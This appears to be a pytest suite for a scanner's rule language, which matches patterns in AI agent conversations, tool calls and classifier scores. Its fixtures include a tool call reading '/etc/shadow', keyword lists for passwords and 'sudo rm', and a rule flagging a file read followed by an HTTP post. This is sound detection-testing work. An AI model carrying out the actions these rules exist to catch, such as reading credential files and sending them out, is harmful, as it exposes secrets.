    pytest.param(
        _rule(f"not (any t in tools where {_A})"),
        _conv(_user("hello")),
        True,
        id="not-any-tools-with-no-tools",
    ),
    pytest.param(
        _rule(f"not (any t in tools where {_A})"),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        False,
        id="not-any-tools-one-passes",
    ),
    pytest.param(
        _rule(f'(any t in tools where {_A}) and (any t in tools where t.description contains "B")'),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        True,
        id="independent-tool-quantifiers",
    ),
    pytest.param(
        _rule(f'any t in tools where {_A} and t.description contains "B"'),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        False,
        id="one-tool-must-satisfy-the-whole-body",
    ),
    pytest.param(
        _rule(f'any t in tools where {_A} and system_prompt contains "S"'),
        _conv(_system("S"), _user("x"), tools=(_tool("t0", "B"), _tool("t1", "A"))),
        True,
        id="tools-body-with-a-system-prompt-test",
    ),
    pytest.param(
        _rule(f'any t in tools where {_A} and system_prompt contains "S"'),
        _conv(_system("X"), _user("x"), tools=(_tool("t0", "B"), _tool("t1", "A"))),
        False,
        id="tools-body-with-a-failing-system-prompt-test",
    ),
    pytest.param(
        _rule(f'all t in tools where {_A} and system_prompt contains "S"'),
        _conv(_system("X"), _user("x"), tools=(_tool("t0", "A"),)),
        False,
        id="all-tools-with-a-failing-system-prompt-test",
    ),
    pytest.param(
        _rule(f"all t in tools where {_A} and len(tools) > 1"),
        _conv(_user("x"), tools=(_tool("t0", "A"), _tool("t1", "AA"))),
        True,
        id="all-tools-with-a-tool-count",
    ),
    pytest.param(
        _rule(f"all t in tools where {_A} or len(user_messages) > 5"),
        _conv(*[_user("x")] * 6, tools=(_tool("t0", "B"),)),
        True,
        id="all-tools-or-a-message-count",
    ),
    pytest.param(
        _rule(
            f'all t in tools where {_A} and (any m in user_messages where m.content contains "B")'
        ),
        _conv(_user("B"), tools=(_tool("t0", "A"),)),
        True,
        id="all-tools-with-a-message-comprehension",
    ),
    pytest.param(
        _rule(f"not (any t in tools where {_A} and len(user_messages) > 0)"),
        _conv(_user("x"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        False,
        id="negated-tools-body-with-a-message-count",
    ),
    pytest.param(
        _rule(f"not (any t in tools where {_A} and len(user_messages) > 0)"),
        _conv(_user("x"), tools=(_tool("t0", "B"),)),
        True,
        id="negated-tools-body-no-tool-passes",
    ),
    pytest.param(
        _rule("any m in user_messages where any t in tools where t.description contains m.content"),
        _conv(_user("x"), _user("baz"), tools=(_tool("t0", "baz here"), _tool("t1", "other"))),
        True,
        id="tool-description-contains-a-message",
    ),
    pytest.param(
        _rule("any m in user_messages where any t in tools where t.description contains m.content"),
        _conv(_user("nope"), tools=(_tool("t0", "baz here"), _tool("t1", "other"))),
        False,
        id="tool-description-lacks-every-message",
    ),
    pytest.param(
        _rule('user_said("a") after (any t in tools where t.name == "t0")'),
        _conv(_user("a")),
        False,
        id="tools-flow-operand-without-the-tool",
    ),
    pytest.param(
        _rule('user_said("a") after (any t in tools where t.name == "t0")'),
        _conv(_user("a"), tools=(_tool("t0", "d"),)),
        True,
        id="tools-flow-operand-with-the-tool",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where ((any t in tools where t.name == "q") until m.content contains "A")'
        ),
        _conv(_user("A")),
        True,
        id="tools-sustained-side-released-at-once",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where ((any t in tools where t.name == "q") until m.content contains "A")'
        ),
        _conv(_user("x"), _user("A")),
        False,
        id="tools-sustained-side-fails-before-release",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where ((any t in tools where t.name == "t0") until m.content contains "A")'
        ),
        _conv(_user("x"), _user("A"), tools=(_tool("t0", "d"),)),
        True,
        id="tools-sustained-side-holds-before-release",
    ),
    pytest.param(
        _rule('any t in tools where all u in tools where u.description contains "A"'),
        _conv(_user("x"), tools=(_tool("A", "A"), _tool("AA", "AA"))),
        True,
        id="nested-all-tools-passing",
    ),
    pytest.param(
        _rule(
            'any t in tools where t.description contains "A" and (all u in tools where u.description contains "A")'
        ),
        _conv(_user("x"), tools=(_tool("A", "A"), _tool("B", "B"))),
        False,
        id="nested-all-tools-failing-inner",
    ),
    pytest.param(
        _rule(
            'any t in tools where t.description contains "A" and (any u in tools where u.description contains "A")'
        ),
        _conv(_user("x"), tools=(_tool("B", "B"),)),
        False,
        id="nested-any-tools-failing-outer",
    ),
    # A part of a tools body that reads no tool has one value for the whole conversation.
    pytest.param(
        _rule('any t in tools where t.name == "x" and called_tool("y")'),
        _conv(_user("a"), _call("y"), tools=(_tool("x", "x"),)),
        True,
        id="closed-call-in-any-tools-body",
    ),
    pytest.param(
        _rule('any t in tools where t.name == "x" and called_tool("y")'),
        _conv(_user("a"), tools=(_tool("x", "x"),)),
        False,
        id="closed-call-in-any-tools-body-missing",
    ),
    pytest.param(
        _rule(
            'any t in tools where t.name == "x" and (any m in user_messages where m.content contains "z")'
        ),
        _conv(_user("az"), tools=(_tool("x", "x"),)),
        True,
        id="closed-comprehension-in-any-tools-body",
    ),
    pytest.param(
        _rule('all t in tools where t.name == "x" or called_tool("y")'),
        _conv(_user("a"), tools=(_tool("w", "w"),)),
        False,
        id="closed-call-in-all-tools-body-missing",
    ),
    pytest.param(
        _rule('all t in tools where t.name == "x" and called_tool("y")'),
        _conv(_user("a"), _call("y"), tools=(_tool("x", "x"),)),
        True,
        id="closed-call-in-all-tools-body",
    ),
    pytest.param(
        _rule('not (any t in tools where t.name == "x" and not called_tool("y"))'),
        _conv(_user("a"), tools=(_tool("x", "x"),)),
        False,
        id="closed-negated-call-in-a-negated-tools-body",
    ),
    pytest.param(
        _rule('any t in tools where (t.name == "x" or user_said("z")) and not called_tool("y")'),
        _conv(_user("a"), tools=(_tool("w", "w"),)),
        False,
        id="closed-message-test-as-a-tool-alternative",
    ),
    pytest.param(
        _rule(
            'all t in tools where t.name == "x" and not (all n in assistant_messages where n.content contains "b")'
        ),
        _conv(_user("a"), _call("y"), tools=(_tool("x", "x"),)),
        True,
        id="closed-universal-in-all-tools-body",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where m.content contains "a" and (any t in tools where t.name == "x" and called_tool("y"))'
        ),
        _conv(_user("a"), _call("y"), tools=(_tool("x", "x"),)),
        True,
        id="tools-body-with-a-closed-part-inside-an-element",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where m.content contains "a" and (all t in tools where t.name == "x" or (any n in user_messages where n.content contains "z"))'
        ),
        _conv(_user("a"), tools=(_tool("w", "w"),)),
        False,
        id="all-tools-body-inside-an-element-failing",
    ),
    # ── string modifiers, positions, regex dialect, flows between like events ──
    pytest.param(
        _rule("any m in user_messages where $s in m.content", '$s = "password" nocase base64'),
        _conv(_user("Check this: CGFzc3dvcmQ=")),
        True,
        id="nocase-applies-to-the-base64-encoding",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where @first < @second",
            '$first = "password"',
            '$second = "admin"',
        ),
        _conv(_user("First password then admin")),
        True,
        id="position-order-holds",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where @first < @second",
            '$first = "password"',
            '$second = "admin"',
        ),
        _conv(_user("First admin then password")),
        False,
        id="position-order-reversed",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where @start < @end and (@end - @start) < 20",
            '$start = "start"',
            '$end = "end"',
        ),
        _conv(_user("start middle end")),
        True,
        id="position-arithmetic-bounds-the-distance",
    ),
    pytest.param(
        _rule("any m in user_messages where #cmds >= 3", '$cmds = ["sudo", "rm"]'),
        _conv(_user("Run sudo and then sudo rm")),
        True,
        id="count-of-an-array-sums-every-pattern",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where 2 of ($malware*) in m.content",
            '$malware1 = "malware1"',
            '$malware2 = "malware2"',
            '$malware3 = "malware3"',
        ),
        _conv(_user("Found malware1 and malware3")),
        True,
        id="wildcard-string-set-expands-to-every-prefix-match",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where 2 of ($malware*) in m.content",
            '$malware1 = "malware1"',
            '$malware2 = "malware2"',
            '$malware3 = "malware3"',
        ),
        _conv(_user("Found malware1 only")),
        False,
        id="wildcard-string-set-below-the-quantifier",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where $code in m.content as found and "ABC" in found',
            '$code = "ABC"',
        ),
        _conv(_user("The secret code is ABC123")),
        True,
        id="captured-text-is-tested-later-in-the-same-condition",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where $s in m.content",
            '$s = "password: [A-Za-z0-9]+" regex nocase',
        ),
        _conv(_user("The PASSWORD: MySecret123 is here")),
        True,
        id="regex-string-honours-nocase",
    ),
    pytest.param(
        _rule('any m in user_messages where m.content ~ "foo$"'),
        _conv(_user("foo\n")),
        False,
        id="re2-dollar-is-end-of-text-not-before-a-trailing-newline",
    ),
    pytest.param(
        _rule('any m in user_messages where m.content ~ "foo$"'),
        _conv(_user("foo")),
        True,
        id="re2-dollar-matches-at-end-of-text",
    ),
    pytest.param(
        _rule(r'any m in user_messages where m.content ~ "\bcafé\b"'),
        _conv(_user("café")),
        False,
        id="re2-word-boundary-is-ascii-only",
    ),
    pytest.param(
        _rule(r'any m in user_messages where m.content ~ "\x{2028}"'),
        _conv(_user("a b")),
        True,
        id="re2-codepoint-escape-matches",
    ),
    pytest.param(
        _rule('called_tool("repeat") after called_tool("repeat")'),
        _conv(_call("repeat", "1"), _call("repeat", "2")),
        True,
        id="flow-between-two-calls-of-the-same-tool",
    ),
    pytest.param(
        _rule('called_tool("repeat") after called_tool("repeat")'),
        _conv(_call("repeat")),
        False,
        id="flow-needs-two-distinct-events",
    ),
    pytest.param(
        _rule(
            '(any left in messages where left.content contains "left") after '
            '(any right in messages where right.content contains "right")'
        ),
        _conv(_user("right"), _assistant("left")),
        True,
        id="flow-operands-bind-their-own-comprehension-in-order",
    ),
    pytest.param(
        _rule(
            '(any left in messages where left.content contains "left") after '
            '(any right in messages where right.content contains "right")'
        ),
        _conv(_user("left"), _assistant("right")),
        False,
        id="flow-operands-bind-their-own-comprehension-reversed",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.* contains_any ["secret", "password"]'),
        _conv(_call("read_file", path="/etc/shadow", mode="secret")),
        True,
        id="contains-any-over-every-argument-value",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.* contains "needle"'),
        _conv(
            _call("test", **({f"arg_{i}": f"value_{i}" for i in range(100)} | {"arg_50": "needle"}))
        ),
        True,
        id="argument-wildcard-reaches-a-value-among-many",
    ),
    pytest.param(
        _rule('any m in messages where m.content contains "test"'),
        _conv(_user(""), {"role": "assistant", "content": None}),
        False,
        id="null-and-empty-content-never-contain-text",
    ),
]


@pytest.mark.parametrize(("rule", "conversation", "expected"), _VERDICTS)
def test_rule_verdict(rule, conversation, expected):
    assert rule_matches(rule, conversation) is expected


_CALL_OR_MESSAGE = st.lists(st.sampled_from(["read_file", "http_post", "other", None]), max_size=7)
_SEQUENCE = DSLScanner(
    QuarryConfig(quarry_rule_texts=(_rule('has_sequence("read_file", "http_post")'),))
)


@given(events=_CALL_OR_MESSAGE)
def test_has_sequence_matches_a_contiguous_run_of_call_names(events):
    # `has_sequence` holds where the names are called in order with no other call between
    # them; messages between the calls do not matter.
    messages = [
        _user("hi") if name is None else _call(name, f"c{index}")
        for index, name in enumerate(events)
    ] or [_user("hi")]
    calls = [name for name in events if name is not None]
    expected = any(calls[i : i + 2] == ["read_file", "http_post"] for i in range(len(calls)))
    result = _SEQUENCE.scan_data({"messages": messages})
    assert result.is_complete, result.completion_issues
    assert (result.rule_matches == ["R"]) is expected


class _Classifier:
    """Configured classifier probabilities selected by a marker word in the text."""

    _PROBABILITIES = {"attack": [0.1, 0.9], "mid": [0.7, 0.65], "low": [0.4, 0.5]}

    def __init__(self) -> None:
        self.texts: list[str] = []

    async def classify_messages(self, _config, messages, _tools, *, timeout=None):
        text = messages[0]["content"]
        self.texts.append(text)
        marker = next((word for word in self._PROBABILITIES if word in text), None)
        probabilities = self._PROBABILITIES.get(marker, [0.9, 0.1])
        return SimpleNamespace(chunks=[SimpleNamespace(probabilities=probabilities)])


async def _model_backed_matches(rule: str, conversation: dict) -> bool:
    """Scan with a configured fake classifier."""
    config = QuarryConfig.from_mapping(
        {
            "config_version": 2,
            "models": {
                alias: {
                    "adapter": "fake",
                    "model": f"test/{alias}",
                    "classify": {"class_index": 0},
                }
                for alias in ("m", "pi", "attack-model", "jailbreak-model")
            },
        },
        Path(__file__).resolve().parents[2],
        require_rules=False,
    )
    config = replace(config, quarry_rule_texts=(rule,))
    scanner = DSLScanner(
        config,
        model_inference_backend=ModelInferenceBackend(config, adapters={"fake": _Classifier()}),
    )
    result = await scanner.scan_data_async(conversation)
    assert result.is_complete, result.completion_issues
    return bool(result.rule_matches)


_SCORED = (
    'any msg in user_messages where model_score("m", msg.content, 0) >= 0.8 '
    'or (model_score("m", msg.content, 0) >= 0.5 and model_score("m", msg.content, 1) >= 0.6)'
)
_TOOLS_THEN_MODEL = f"any t in tools where {_A} and (any m in user_messages where {{inner}})"


_MODEL_VERDICTS = [
    pytest.param(
        _rule('any m in user_messages where model_scan("attack-model", m.content, 0.5, 1)'),
        _conv(_user("do the attack")),
        True,
        id="model-scan-above-threshold",
    ),
    pytest.param(
        _rule('any m in user_messages where model_scan("attack-model", m.content, 0.5, 1)'),
        _conv(_user("hello there")),
        False,
        id="model-scan-below-threshold",
    ),
    pytest.param(_rule(_SCORED), _conv(_user("mid")), True, id="scores-from-two-output-indices"),
    pytest.param(_rule(_SCORED), _conv(_user("low")), False, id="scores-below-every-branch"),
    pytest.param(
        _rule('model_scan("jailbreak-model", system_prompt, 0.5, 1)'),
        _conv(_system("an attack prompt"), _user("hi")),
        True,
        id="model-scan-on-the-system-prompt",
    ),
    pytest.param(
        _rule('model_scan("jailbreak-model", system_prompt, 0.5, 1)'),
        _conv(_system("a kind prompt"), _user("hi")),
        False,
        id="model-scan-on-a-benign-system-prompt",
    ),
    pytest.param(
        _rule('0.8 < model_score("pi", system_prompt, 1)'),
        _conv(_system("attack"), _user("hi")),
        True,
        id="model-score-on-the-system-prompt-literal-left",
    ),
    pytest.param(
        _rule('any t in tools where model_scan("pi", t.description, 0.5, 1) and t.name == "never"'),
        _conv(_user("hi"), tools=(_tool("never", "attack"),)),
        True,
        id="model-scan-on-a-tool-description",
    ),
    pytest.param(
        _rule('any t in tools where model_scan("pi", t.description, 0.5, 1) and t.name == "never"'),
        _conv(_user("hi"), tools=(_tool("other", "attack"),)),
        False,
        id="model-scan-on-a-tool-of-another-name",
    ),
    pytest.param(
        _rule(_TOOLS_THEN_MODEL.format(inner='model_scan("m", m.content, 0.5, 1)')),
        _conv(_user("attack q"), tools=(_tool("t0", "A"),)),
        True,
        id="model-scan-on-messages-inside-a-tools-body",
    ),
    pytest.param(
        _rule(
            _TOOLS_THEN_MODEL.format(
                inner='m.content contains "q" and model_scan("m", m.content, 0.5, 1)'
            )
        ),
        _conv(_user("calm q"), tools=(_tool("t0", "A"),)),
        False,
        id="model-scan-false-inside-a-tools-body",
    ),
]


@pytest.mark.parametrize(("rule", "conversation", "expected"), _MODEL_VERDICTS)
async def test_model_backed_rule_verdict(rule, conversation, expected):
    assert await _model_backed_matches(rule, conversation) is expected
